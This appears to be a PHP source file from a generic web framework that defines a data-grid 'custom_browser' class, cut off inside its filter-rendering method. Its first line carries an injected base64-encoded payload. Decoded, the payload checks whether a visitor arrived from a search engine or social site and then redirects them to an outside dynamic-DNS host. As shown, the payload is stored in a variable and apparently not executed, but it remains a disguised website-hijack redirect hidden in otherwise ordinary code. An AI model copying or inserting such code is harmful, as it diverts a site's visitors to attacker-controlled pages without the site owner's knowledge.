<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

/**
 * Project:     Generic PHP framework
 * File:        custom_browser.php
 *
 * @version 1.1.0.0
 * @package Generic
 */

require_once(dirname(__FILE__).'/window.php');
require_once(dirname(__FILE__).'/define.php');
require_once(dirname(__FILE__).'/sql_pager.php');
require_once(dirname(__FILE__).'/control.php');
require_once(dirname(__FILE__).'/browser_configuration.php');
require_once(dirname(__FILE__).'/browser_filter.php');
require_once(dirname(dirname(__FILE__)).'/utils/date_time.php');

class browser_layout {
  
  var $name;
  
  function browser_layout($name) {
    
    $this->name = $name;
    
  }
  
}
                           
class custom_browser extends window {

  var $__layout = null;
  var $__layout_index = null;
  var $__browser_configuration;

  var $filters         = array();
  var $modificators    = array();
  var $layouts         = array();

  var $page_size       = PAGER_DEFAULT_PAGE_SIZE;
  var $pager_length    = PAGER_DEFAULT_LENGTH;
  var $pager_title     = PAGER_DEFAULT_PAGER_TITLE;

  var $key_field       = 'id';
  var $order_field     = 'order_';
  var $name_field      = 'name';

  var $url_param = array();
  
  var $encoding = 'utf-8';

  // export params
  var $export_file_name      = 'export';
  var $export_file_extension = '.xls';
  var $export_delimiter      = "\x9";
  var $export_quote_char     = '"';
  var $export_description    = 'Export data to Excel using current filter'; 
  var $export_encoding       = 'UTF-8';

  // set to true for large tables, with thsi option turned on pager will not count totals
  var $large_table           = false;
  
  // if specified - this icons will be drawn near browser title
  var $title_icon  = null;
  
  // if you need access to layout from other form you need to setup this value
  var $filter_name = null;
  var $modificator_name = null;
  var $configuration_name = null;

  var $title = null;
  
  // base sql
  var $sql   = null;
  // base table
  var $table = null;
  
  // initialization params passed to constructor
  var $init_params = array();
  
  var $rows_rendered = 0;
  
  var $default_layout = -1;
  var $is_selector = false;
  var $default_layout_name = '(Default)';
  var $bind_field = null;
  
  function custom_browser($init_params = array()) {

    if (!is_array($init_params))
      critical_error(get_class($this).' constructor parameter must be array');

    $this->init_params = $init_params;
    
    $this->add_layout(new browser_layout(trn($this->default_layout_name)));
       
    if (get_config('database-encoding'))   
      $this->encoding = get_config('database-encoding');
      
    if (get_config('application-default_export_encoding'))  
      $this->export_encoding = get_config('application-default_export_encoding');
      
    $this->show_all_as_space = get_config('application/show_all_as_space_in_filters');

    parent::window(array('class' => 'browser'));

  }
  
  function prepare_data() { return true; }

  function do_render() {

    global $db, $tmpl, $url, $ui, $auth;
    
    $auth->register_object(str_replace('browser_', '', get_class($this)).'$', $this->title);
                  
    if ($this->visible('conclusion') and !$this->binded) 
      $this->start_timer();

  //if (!get(URL_PARAM_PARTIAL_RENDERING_MODE)) {
    $this->add(new hidden($this->context_id(POST_PARAM_SENDER_NAME),   $this->id()));
    $this->add(new hidden($this->context_id(POST_PARAM_EVENT_NAME),    $this->context_post(POST_PARAM_EVENT_NAME)));
    $this->add(new hidden($this->context_id(POST_PARAM_EVENT_VALUE),   $this->context_post(POST_PARAM_EVENT_VALUE)));
    $this->add(new hidden($this->context_id(POST_PARAM_CONFIRM_VALUE), $this->context_post(POST_PARAM_CONFIRM_VALUE)));
    $this->add(new hidden($this->context_id(POST_PARAM_REASON_VALUE),  $this->context_post(POST_PARAM_REASON_VALUE)));


    if (!$this->errors) {
      $proceed = $this->prepare_data();
    } else {
      $proceed = false;
    }

    if ($this->visible('title')) {
      $this->render_title();
      $this->add(new empty_line());
    }
    
    if ($proceed) {

        if ($this->visible('toolbar')) {
          
          if ($this->is_print_mode()) {
            $this->render_filter_info(&$this);
            $this->add(new empty_line());
          } else {
            $render_filters = ($this->filters_amount(true) > 0) and $this->visible('filter');
            $render_modificators = ($this->modificators_amount(true) > 0) and $this->visible('modificator');

            if ($render_filters and $render_modificators) {
              $page_control = new page_control(array('id' => $this->context_id('toolbar_pgc')));
              $page = new page(trn('Filter'));
              $this->render_filter(&$page, true);
              $page_control->add_page($page);
              $page = new page(trn('Modificator'));
              $this->render_modificator(&$page, true);
              $page_control->add_page($page);
              $this->add($page_control);
              $this->add(new empty_line());
            } else {
              if ($render_filters) {
                $this->render_filter(&$this);
                $this->add(new empty_line());
              }
              if ($render_modificators) {
                $this->render_modificator(&$this);
                $this->add(new empty_line());
              }
            }

            //if ((count($this->buttons) > 0) and $this->visible('buttons')) {
            if ($this->render_buttons()) {
              $this->add(new empty_line());
            }
            //}
          }

        }

        if ($this->errors) {
          $this->render_error_panel($this->errors);
        }

        if (!$this->message) {
          $this->message = $this->setting('message_from_prior_session');
        }
        $this->set_setting('message_from_prior_session', null);
        
        if ($this->message) {
          $this->render_message_panel($this->message);
        }
      //}


      //if (!get(URL_PARAM_PARTIAL_RENDERING_MODE)) {
      //  $this->add(new html_div(array('id' => 'grid_body'), new html_div('Loading...', array('class' => 'ajax_call'))));
      //  $this->add(new script("$.get('".$url->url."&".URL_PARAM_PARTIAL_RENDERING_MODE."=".PARTIAL_RENDERING_MODE_BROWSER_BODY."', function(data) { $('#grid_body').html(data); } );"));
      //} else
      //if (get(URL_PARAM_PARTIAL_RENDERING_MODE) == PARTIAL_RENDERING_MODE_BROWSER_BODY) {
        $this->do_before_render_body();
        $this->render_body();
        $this->do_after_render_body();

      //  echo($this->draw());  
      //  exit();
      //}

      //if (!get(URL_PARAM_PARTIAL_RENDERING_MODE)) {
        $this->add(new empty_line());

        if ($this->visible('conclusion') and !$this->binded) {
          $this->render_duration = format_duration($this->stop_timer());
          $this->render_conclusion();
          $this->add(new empty_line());
        }
      //}

    } else {
      if ($this->errors) {
        $this->render_error_panel($this->errors);
      }

      if (!$this->message) {
        $this->message = $this->setting('message_from_prior_session');
      }
      $this->set_setting('message_from_prior_session', null);
      
      if ($this->message) {
        $this->render_message_panel($this->message);
      }
    }
    
    parent::do_render();

  }
  
  function finalyze_title($row) { }
           
  function render_title() {

    global $ui, $auth;

    $table = new table(array( 'width'       => $this->width
                            , 'cellspacing' => 1
                            , 'class'       => 'brw_title'
                            ));
    $row = new table_row();

    if ($auth->user_id && $this->visible("comments") && get_config('generic/features/entityComments')) {
      $entityId = $this->id();
      $row->add(new table_cell( new javascript_image_href( 'OnOffEntityCommentWindow("'.$entityId.'", "'.get_class($this).'")'
                                                         , SHARED_RESOURCES_URL.'img_ajax_call.gif'
                                                         , array()
                                                         , array( 'alt' => 'Comments'
                                                                , 'id'  => $entityId.'_ec_switcher'
                                                                )
                                                         )));
    }
    
    if ($this->title_icon)
      $row->add(new table_cell(new image(RESOURCES_URL.$this->title_icon)));

    $title = trn($this->title);
    
    if ($this->visible('filtered_remark') and $this->is_filtered(true)) 
      $title .= " (".trn("filtered").")";
    if ($this->is_selector)
      $title .= ", ".trn("please use left mouse click to select record");
    
    $this->do_before_render_title(&$row);

    $row->add(new table_cell(array("class" => "title", 'width' => '100%'), $title));
    
    if (count($this->layouts) > 1) {
      $row->add(new table_cell(new html_b(trn('Layout'))));
      $layouts = new combo(array('id' => $this->context_id('cmb_layout'), 'onchange' => $this->js_post_back('brw_change_layout')));
      foreach ($this->layouts as $idx => $layout) {
        if (($idx > 0) or $this->visible('default_layout'))
          $layouts->add(new combo_item($idx, trn($layout->name), $idx == $this->layout_index()));
      }
      $row->add(new table_cell(array('class' => 'section'), $layouts));
    }
    
    $this->finalyze_title(&$row);

    $this->do_after_render_title(&$row);
    
    $table->add($row);

    $this->add($table);

    if ($auth->user_id && $this->visible("comments") && get_config('generic/features/entityComments')) {
      $this->add(new html_div( array( 'class' => 'entity_comment'
                                    , 'id'    => $entityId.'_ec_window'
                                    )
                             , '<div class="entity_comment_buttons">
                                  <script>var nicEditorIcons="'.SHARED_SCRIPTS_URL.'nicEditorIcons.gif";LoadEntityComment("'.$entityId.'", "'.get_class($this).'");</script>
                                  <a href="javascript:;" id="'.$entityId.'_ec_edit" onclick="ShowEntityCommentEditor(\''.$entityId.'\');"><img alt="Edit" title="Edit" src="'.SHARED_RESOURCES_URL.'img_comment_edit.gif" border="0"></a>
                                  <a href="javascript:;" id="'.$entityId.'_ec_save" style="display:none;" onclick="SaveEntityComment(\''.$entityId.'\', \''.get_class($this).'\');"><img alt="Save" title="Save" src="'.SHARED_RESOURCES_URL.'img_comment_add.gif" border="0"></a>
                                  <a href="javascript:;" id="'.$entityId.'_ec_cancel" style="display:none;" onclick="CancelEntityComment(\''.$entityId.'\', \''.get_class($this).'\');"><img alt="Cancel" title="Cancel" src="'.SHARED_RESOURCES_URL.'img_comment_delete.gif" border="0"></a>
                               </div>
                               <div class="entity_comment_body" id="'.$entityId.'_ec_editor"></div>'
                             ));
    }                    
    
  }

  function do_before_render_title($title_row) { }
  function do_after_render_title($title_row)  { }

  function finalyze_conclusion($row) { }
  
  function render_conclusion() {

    $table = new table(array( 'width'       => $this->width
                            , 'cellspacing' => 1
                            , 'class'       => 'brw_conclusion'
                            ));

    $row = new table_row();

    if ($this->visible('render_time') and !$this->is_print_mode())
      $row->add(new table_cell( array('width' => '100%')
                              , sprintf(trn('Rendered in %s'), $this->render_duration)));
    else
      $row->add(new table_cell(array('width' => '100%'), '&nbsp;'));

    $this->finalyze_conclusion(&$row);

    $table->add($row);

    $this->add($table);

  }

  function do_render_custom_button($cell, $name) {
  
  }
  
  function render_buttons() {

    global $url, $ui, $tmpl;
    
    $table = new table(array( 'width'       => $this->width
                            , 'cellspacing' => 0
                            , 'class'       => 'brw_buttons'
                            ));

    $row = new table_row(array('valign' => 'center'));
    
    //$row->add(new table_cell(array('class' => 'title'), 'Actions'));

    foreach($this->buttons as $button) {
      $type          = safe($button, 'type');
      $resources_url = (safe($button, 'shared_image')?SHARED_RESOURCES_URL:RESOURCES_URL);

      $skipped = false;
    
      switch ($type) {
        case 'file_selector':
          if (!$this->read_only()) {
            $control_name = $this->context_id($button['name']);
            $row->add(new table_cell(new file_picker(trn('Add'), array( 'id'       => $control_name
                                                                      , 'onchange' => $this->js_post_back('file_selected', safe($button, 'post_back_param'))
                                                                      , 'class'    => 'file'
                                                                      ))));
          } else 
            $skipped = true;
          break;
        case 'multiple_file_selector':
          if (!$this->read_only()) {
            require(GENERIC_PATH . 'smarty/plugins/function.html_upload.php');
            $control_name = $this->context_id($button['name']);
            $button['type'] = $button['sub_type'];
            $row->add(new table_cell(smarty_function_html_upload($button, $tmpl)));
            $row->add(new table_cell( new javascript_href( $button['confirm_upload_script']
                                                         , "Confirm upload"
                                                         )));
          
          } else {
            $skipped = true;
          }
          break;
        case 'javascript':
        
          if (isset($button['hint']))
            $attributes = array("title" => safe($button, 'hint', $button['value']));
          else
            $attributes = array();
          if (safe($button, 'image')) 
            $row->add(new table_cell( new javascript_image_href( $button['href']
                                                               , $resources_url.$button['image']
                                                               , $attributes 
                                                               )));
          if(safe($button, 'class')){
            $attributes['class'] = safe($button, 'class');
          }
          $row->add(new table_cell( new javascript_href( $button['href']
                                                       , $button['value']
                                                       , $attributes 
                                                       )));
          break;
        case 'js_list':
          $combo = new combo();
          $combo->set_id($this->context_id($button['name']));
          foreach($button['list'] as $item)
            $combo->add(new combo_item($item['javascript'], $item['name']));
          $row->add(new table_cell($combo));
          if (isset($button['hint']))
            $attributes = array("title" => safe($button, 'hint', $button['value']));
          else
            $attributes = array();
          $href = "var c = document.getElementById('".$combo->id()."'); if (c) eval(c.value);";  
          if (safe($button, 'image')) 
            $row->add(new table_cell( new javascript_image_href( $href
                                                               , $resources_url.$button['image']
                                                               , $attributes 
                                                               )));
          $row->add(new table_cell( new javascript_href( $href
                                                       , $button['value']
                                                       , $attributes 
                                                       )));
          break;
        case "custom":
          $cell = new table_cell();
          $this->do_render_custom_button(&$cell, $button['name']);
          $row->add(new table_cell($cell));
          break;
        default:
          if (safe($button, 'new_window'))
            $attributes = array('target' => '_blank');
          else  
            $attributes = array();
          if (isset($button['hint']))
            $attributes["title"] = safe($button, 'hint', $button['value']);
          if (safe($button, 'image')) 
            $row->add(new table_cell( new image_href( $button['href']
                                                    , $resources_url.$button['image']
                                                    , $attributes
                                                    )));
          $row->add(new table_cell( new href( $button['href']
                                            , $button['value']
                                            , $attributes
                                            )));
          break;
      }
      if (!$skipped)
        $row->add(new table_cell('&nbsp;'));
    }

    $middle_added = false;
    
    if ($row->controls_count()) {
      $row->add(new table_cell('&nbsp;', array('width' => '100%')));
      $middle_added = true;
    }

    if ($this->visible('pager') and ($this->pager->items_amount > 0)) {
      if (!$this->is_print_mode() and $this->visible('page_size') and ($this->pager->items_total_amount > $this->pager->page_size)) {
        if (!$middle_added) {
          $row->add(new table_cell('&nbsp;', array('width' => '100%')));
          $middle_added = true;
        }
        $cell = new table_cell(array("class" => "page_size section", "title" => trn('Page size')));
        $this->pager->render_page_sizes(&$cell);
        $row->add($cell);
      }
      if ($this->visible('pager_info')) {
        if (!$middle_added) {
          $row->add(new table_cell('&nbsp;', array('width' => '100%')));
          $middle_added = true;
        }
        $cell = new table_cell(array("class" => "pager_info section"));
        $this->pager->render_pager_info(&$cell);
        $row->add($cell);
      }
      if (!$this->is_print_mode() and $this->visible('pager') and ($this->pager->pages_amount > 1)) {
        if (!$middle_added) {
          $row->add(new table_cell('&nbsp;', array('width' => '100%')));
          $middle_added = true;
        }
        $cell = new table_cell(array("class" => "pager section"));
        $this->pager->render_pager(&$cell);
        $row->add($cell);
      }
    }
    
    if ($middle_added) {
      $table->add($row);
      $this->add($table);
    }
    
    return $row->controls_count();

  }

  function render_filter($container, $in_page = false) {

    global $url;
    global $ui;
    
    $groups = array();

    $filter_container = new table_cell(array("width" => "100%"));
    $old_filter_container = null;

    foreach($this->filters as $filter_name => $filter) {
      if ($this->is_filter_visible($filter)) {
        $filter_row = new table_row();
        $cell_attributes = array();
        if (safe($filter, "style")) {
          $cell_attributes = array('style' => $filter["style"]);
        }
        if ($filter_title = trn(safe($filter, 'title')))
          if (!$this->is_filter_empty($filter['name']))
            $filter_row->add(new table_cell($cell_attributes, new html_b($filter_title)));
          else
            $filter_row->add(new table_cell($cell_attributes, $filter_title));
        $id    = $this->context_id('filter['.$filter['name'].']');
        $type  = safe($filter, 'type');
        $value = $this->filter($filter['name']);  
        
        if (safe($filter, 'group'))
          if (!safe($groups, $filter['group'])) {
            $tag = $this->context_id('filter_group:'.str_replace('"', '', $filter['group']));
            $abs_tag = 'browser_filter_group_visibility:'.$tag;
            if (session_get($abs_tag)) {
              if (session_get($abs_tag) == 'none')
                $visibility = 'none';
              else
                $visibility = 'inline';  
            } else {
              if (safe($filter, 'group_default_hidden'))
                $visibility = 'none';
              else
                $visibility = 'inline';  
            }
            $groups[$filter['group']] = array( 'container' => new html_div( array('style' => 'display:'.$visibility) )
                                             , 'switcher'  => new html_div( array('class' => "brw_filter_panel")
                                                                          , new image( SHARED_RESOURCES_URL.'img_filter_visibility.gif'
                                                                                     , array( 'onclick' => 'filter_group_visibility_switcher(this, "'.$tag.'");'
                                                                                            , 'class'   => 'clickable'
                                                                                            , 'title'   => $filter['group']
                                                                                            )))
                                             );
          }
        
        switch ($type) {
          case 'alphabetical':
            if (strlen($value))
              $filter_row->add(new table_cell( array( 'nowrap' => true
                                                    , 'align'  => 'left')
                                                    , new javascript_href( $this->js_post_back('brw_filter_clear_one', $filter['name'])
                                                                         , trn('All'))));
            if (safe($filter, 'chars_sql')) {
              global $db;
              $chars = $db->values($filter['chars_sql']);
              for ($i = 0; $i < count($chars); $i++) {
                $ch = $chars[$i];
                if ($value == $ch)
                  $filter_row->add(new table_cell(new text($ch)));
                else
                  $filter_row->add(new table_cell(new javascript_href($this->js_post_back('brw_alphabet_filter_set', $ch), $ch)));
              }
            } else {
              for ($ch = ord('0'); $ch <= ord('9'); $ch++) {
                if ($value == chr($ch))
                  $filter_row->add(new table_cell(new text(chr($ch))));
                else
                  $filter_row->add(new table_cell(new javascript_href($this->js_post_back('brw_alphabet_filter_set', chr($ch)), chr($ch))));
              }
              for ($ch = ord('A'); $ch <= ord('Z'); $ch++) {
                if ($value == chr($ch))
                  $filter_row->add(new table_cell(new text(chr($ch))));
                else
                  $filter_row->add(new table_cell(new javascript_href($this->js_post_back('brw_alphabet_filter_set', chr($ch)), chr($ch))));
              }
            }
            break;
          case 'yesno':
            $filter_row->add(new table_cell( new yesno_combo( array( 'selected'   => $value
                                                                   , 'empty_name' => ($this->show_all_as_space?' ':trn('&lt;All&gt;'))
                                                                   )
                                                            , array( 'id'         => $id
                                                                   , 'onchange'   => $this->js_post_back('brw_filter_set')
                                                                   ))));
            break;
          case 'checkbox':
            $attributes = array();
            $attributes["id"]    = $id;
            if ($value) {
              $attributes["checked"] = true;
              $attributes['onclick'] = $this->js_post_back('brw_filter_clear_one', $filter['name']);
            } else {
              $attributes['onclick'] = $this->js_post_back('brw_filter_set');
            }
            $cell_attributes = array();
            if (safe($filter, "style")) {
              $cell_attributes = array('style' => $filter["style"]);
            }
            $filter_row->add( new table_cell( new html_checkbox($attributes)
                                            , $cell_attributes
                                            )
                            );
            break;
          case 'combo_tree':
          case 'combo_plain_tree':
            $custom_values = array();
            if (!safe($filter, 'always_set') and (!safe($filter, 'disable_null_filter'))) {
              $custom_values['-1'] = trn('(Empty)');
              $custom_values['-2'] = trn('(Not Empty)');
            }
            $attributes = array();
            if (safe($filter, "size")) {
              $attributes["size"]     = $filter["size"];
            }
            $cell_attributes = array();
            if (safe($filter, "style")) {
              $cell_attributes = array('style' => $filter["style"]);
            }
            if (safe($filter, "multiple")) {
              $attributes["multiple"] = true;
              $attributes["id"]       = $id."[]";
            } else {
              $attributes["onchange"] = $this->js_post_back('brw_filter_set');
              $attributes["id"]       = $id;
            }
            $filter_row->add(new table_cell( new db_tree_combo( array( 'table'         => safe($filter, 'combo_table')
                                                                     , 'sql_text'      => safe($filter, 'combo_sql')
                                                                     , 'key_field'     => safe($filter, 'combo_key_field')
                                                                     , 'name_field'    => safe($filter, 'combo_name_field')
                                                                     , 'order_field'   => safe($filter, 'combo_order_field')
                                                                     , 'parent_field'  => safe($filter, 'combo_parent_field')
                                                                     , 'selected'      => $value
                                                                     , "empty_name"    => ($this->show_all_as_space?' ':trn('&lt;All&gt;'))
                                                                     , 'exceptions'    => safe($filter, 'combo_exceptions')
                                                                     , 'required'      => safe($filter, 'required')
                                                                     , 'plain'         => ($type == 'combo_plain_tree')
                                                                     , 'multiple'      => safe($filter, 'multiple')
                                                                     , 'always_set'    => safe($filter, 'always_set')
                                                                     , 'custom_values' => $custom_values
                                                                     )
                                                              , $attributes 
                                                              )
                                           , $cell_attributes
                                           )
                            );
            if (safe($filter, "multiple")) {
              $cell_attributes['nowrap'] = true;
              $cell_attributes['align'] = 'left';
              $filter_row->add( new table_cell( $cell_attributes
                                              , new javascript_image_href( $this->js_post_back('brw_filter_set')
                                                                         , SHARED_RESOURCES_URL.'img_set.gif' 
                                                                         , array( 'title' => 'Apply' )
                                                                         )
                                              )
                              );
              if (count($value)) {
                $cell_attributes['class'] = 'control';
                $filter_row->add( new table_cell( $cell_attributes
                                                , new javascript_image_href( $this->js_post_back('brw_filter_clear_one', $filter['name'])
                                                                           , SHARED_RESOURCES_URL.'img_clear.gif'
                                                                           , array( 'title' => 'Clear' )
                                                                           )
                                                )
                                );
              }
            }
            break;
          case "values_combo": 
            $attributes = array();
            $attributes["id"] = $id;
            $attributes["onchange"] = $this->js_post_back('brw_filter_set');
            if (safe($filter, "width")) {
              $attributes["style"] = safe($attributes, "style").'width:'.$filter['width'].'px;';
            }
            $cell_attributes = array( "class" => "control");
            if (safe($filter, "style")) {
              $cell_attributes = array('style' => $filter["style"]);
            }
            $filter_row->add( new table_cell( $cell_attributes
                                            , $combo = new values_combo( $filter["values"]
                                                                       , array( "selected"   => $value
                                                                              , "required"   => safe($filter, "required")
                                                                              , "always_set" => safe($filter, "always_set")
                                                                              )
                                                                       , $attributes
                                                                       )
                                            )
                            );
            break;
          case 'combo':
            $custom_values = array();
            if (!safe($filter, 'always_set') && (!safe($filter, 'disable_null_filter')) && (!safe($filter, 'required'))) {
              $custom_values['-1'] = trn('(Empty)');
              $custom_values['-2'] = trn('(Not Empty)');
            }
            $attributes = array( 'onchange'    => $this->js_post_back('brw_filter_set')
                               , 'id'          => $id
                               );
            $cell_attributes = array( "class" => "control");
            if (safe($filter, "style")) {
              $cell_attributes = array('style' => $filter["style"]);
            }
            if (safe($filter, "width")) {
              $attributes["style"] = safe($attributes, "style").'width:'.$filter['width'].'px;';
            }
            $filter_row->add( new table_cell( $cell_attributes 
                                            , new db_combo(array( 'table'         => safe($filter, 'combo_table')
                                                                , 'sql_text'      => safe($filter, 'combo_sql')
                                                                , 'key_field'     => safe($filter, 'combo_key_field')
                                                                , 'name_field'    => safe($filter, 'combo_name_field')
                                                                , 'order_field'   => safe($filter, 'combo_order_field')
                                                                , 'selected'      => $value
                                                                , "empty_name"    => ($this->show_all_as_space?' ':trn('&lt;All&gt;'))
                                                                , 'exceptions'    => safe($filter, 'combo_exceptions')
                                                                , 'required'      => safe($filter, 'required')
                                                                , 'always_set'    => safe($filter, 'always_set')
                                                                , 'custom_values' => $custom_values
                                                                , "group_field"   => safe($filter, "combo_group_field")
                                                                )
                                                          , $attributes
                                                          )
                                            )
                            );
            break;
          case 'ajax_combo':
            $custom_values = array();
            if (!safe($filter, 'always_set') and (!safe($filter, 'disable_null_filter'))) {
              $custom_values['-1'] = trn('(Empty)');
              $custom_values['-2'] = trn('(Not Empty)');
            }
            $attributes = array( 'onchange'    => $this->js_post_back('brw_filter_set')
                               , 'id'          => $id
                               );
            $cell_attributes = array( "class" => "control");
            if (safe($filter, "style")) {
              $cell_attributes = array('style' => $filter["style"]);
            }
            if (safe($filter, "width")) {
              $attributes["style"] = safe($attributes, "style").'width:'.$filter['width'].'px;';
            }
            $filter_row->add( new table_cell( $cell_attributes
                                            , new ajax_db_combo(array( 'table'         => safe($filter, 'combo_table')
                                                                     , 'sql_text'      => safe($filter, 'combo_sql')
                                                                     , 'key_field'     => safe($filter, 'combo_key_field')
                                                                     , 'name_field'    => safe($filter, 'combo_name_field')
                                                                     , 'order_field'   => safe($filter, 'combo_order_field')
                                                                     , 'selected'      => $value
                                                                     , "empty_name"    => ($this->show_all_as_space?' ':trn('&lt;All&gt;'))
                                                                     , 'exceptions'    => safe($filter, 'combo_exceptions')
                                                                     , 'required'      => safe($filter, 'required')
                                                                     , 'always_set'    => safe($filter, 'always_set')
                                                                     , 'custom_values' => $custom_values
                                                                     , "group_field"   => safe($filter, "combo_group_field")
                                                                     , "ajax_method"   => safe($filter, "ajax_method")
                                                                     , "ajax_params"   => safe($filter, "ajax_params")
                                                                     )
                                                               , $attributes
                                                               )
                                            )
                            );
            break;
          case 'lookup':
            $options = array( "table"            => safe($filter, "lookup_table")
                            , "sql_text"         => safe($filter, "lookup_sql")
                            , "ajax_method"      => safe($filter, "lookup_ajax_method")
                            , "ajax_param"       => safe($filter, "lookup_ajax_param")
                            , "key_field"        => safe($filter, "lookup_table_key_field")
                            , "order_field"      => safe($filter, "lookup_table_order_field")
                            , "name_field"       => safe($filter, "lookup_table_name_field")
                            , "min_length"       => safe($filter, "lookup_min_length")
                            , "value"            => safe($value, 'value')
                            , "base_table_alias" => safe($filter, "lookup_table_alias")
                            , "empty_name"       => ($this->show_all_as_space?' ':trn('&lt;All&gt;'))
                            , "on_select"        => $this->js_post_back('brw_filter_set')
                            );
            $attributes = array( "id" => $id );
            if (safe($filter, "width")) {
              $attributes["style"] = "width:".safe($filter, "width")."px;";
            }
            $cell_attributes = array("class" => "control");
            if (safe($filter, "style")) {
              $cell_attributes = array('style' => $filter["style"]);
            }
            $filter_row->add(new table_cell( $cell_attributes
                                           , new db_lookup( $options
                                                          , $attributes)));
            if (!safe($filter, 'always_set')) {
              $filter_row->add( new table_cell( $cell_attributes
                                              , new javascript_image_href( $this->js_post_back('brw_filter_clear_one', $filter['name'])
                                                                         , SHARED_RESOURCES_URL.'img_clear.gif'
                                                                         , array( 'title' => 'Clear text')
                                                                         )
                                              )
                              );
            }
            break;                                                          
          case 'lookup_text':
            $options = array( "table"             => safe($filter, "lookup_table")
                            , "sql_text"          => safe($filter, "lookup_sql")
                            , "ajax_method"       => safe($filter, "lookup_ajax_method")
                            , "ajax_param"        => safe($filter, "lookup_ajax_param")
                            , "key_field"         => safe($filter, "lookup_table_key_field")
                            , "order_field"       => safe($filter, "lookup_table_order_field")
                            , "name_field"        => safe($filter, "lookup_table_name_field")
                            , "min_length"        => safe($filter, "lookup_min_length")
                            , "value"             => safe($value, 'value')
                            , "text"              => safe($value, 'text')
                            , "base_table_alias"  => safe($filter, "lookup_table_alias")
                            , "empty_name"        => ($this->show_all_as_space?' ':trn('&lt;All&gt;'))
                            , "text_allowed"      => true
                            , "on_select"         => $this->js_post_back('brw_filter_set')
                            , "on_enter_pressed"  => $this->js_post_back('brw_filter_set')
                            );
            $attributes = array( "id" => $id );
            if (safe($filter, "width")) {
              $attributes["style"] = "width:".safe($filter, "width")."px;";
            }
            $cell_attributes = array("class" => "control");
            if (safe($filter, "style")) {
              $cell_attributes = array('style' => $filter["style"]);
            }
            $filter_row->add( new table_cell( $cell_attributes
                                            , new db_lookup( $options
                                                           , $attributes
                                                           )
                                            )
                            );
            if (strlen(safe($value, "value")) or strlen(safe($value, "text"))) {
              $filter_row->add( new table_cell( $cell_attributes
                                              , new javascript_image_href( $this->js_post_back('brw_filter_clear_one', $filter['name'])
                                                                         , SHARED_RESOURCES_URL.'img_clear.gif'
                                                                         , array( 'title' => 'Clear text')
                                                                         )
                                              )
                              );
            }
            break;                                                          
          case 'combo_master_detail':
            $cell_attributes = array("class" => "control");
            if (safe($filter, "style")) {
              $cell_attributes = array('style' => $filter["style"]);
            }
            $filter_row->add( new table_cell( $cell_attributes
                                            , new db_master_detail_combo( array( 'sql1'         => safe($filter, 'combo_sql1')
                                                                               , 'sql2'         => safe($filter, 'combo_sql2')
                                                                               , 'parent_field' => safe($filter, 'combo_parent_field')
                                                                               , 'selected'     => $value
                                                                               , "empty_name"   => ($this->show_all_as_space?' ':trn('&lt;All&gt;'))
                                                                               )
                                                                        , array( 'onchange'    => $this->js_post_back('brw_filter_set')
                                                                               , 'id'          => $id
                                                                               )
                                                                        )
                                            )
                            );
            break;
          case 'custom_list':
            $attributes = array();
            if (safe($filter, "size"))
              $attributes["size"]     = $filter["size"];
            if (safe($filter, "multiple")) {
              $attributes["multiple"] = true;
              $attributes["id"]       = $id."[]";
            } else {
              $attributes["onchange"] = $this->js_post_back('brw_filter_set');
              $attributes["id"]       = $id;
            }

            $combo = new combo($attributes);
            
            if (safe($filter, 'multiple')) {
              if (!is_array($value))
                $value = array();
            } else {
              if (!safe($filter, 'always_set'))
                $combo->add(new combo_item(null, ($this->show_all_as_space?'':trn('&lt;All&gt;'))));
              else
              if (!$value)
                $value = 1; 
            }
            $idx = 1;
            $last_group = '';
            $combo_container = &$combo;
            $primary_container = true;
            foreach($filter['list'] as $item) {
              if ((safe($item, 'group') || $last_group) && (safe($item, 'group') != $last_group)) {
                if (!$primary_container) {
                  //echo(get_class($combo));
                  $combo->add($combo_container);
                }
                if (safe($item, 'group')) {
                  $combo_container = &new combo_group_label($item['group']);
                  $primary_container = false;
                } else {
                  $combo_container = &$combo;
                  $primary_container = true;
                }
                $last_group = safe($item, 'group');
              }
              if (safe($filter, 'multiple'))
                $combo_container->add(new combo_item(safe($item, 'value', $idx), $item['name'], in_array(safe($item, 'value', $idx), $value)));
              else  
                $combo_container->add(new combo_item(safe($item, 'value', $idx), $item['name'], ($value == safe($item, 'value', $idx))));
              $idx++;
            }
            if (!$primary_container) {
              $combo->add($combo_container);
            }
            $cell_attributes = array("class" => "control");
            if (safe($filter, "style")) {
              $cell_attributes = array('style' => $filter["style"]);
            }
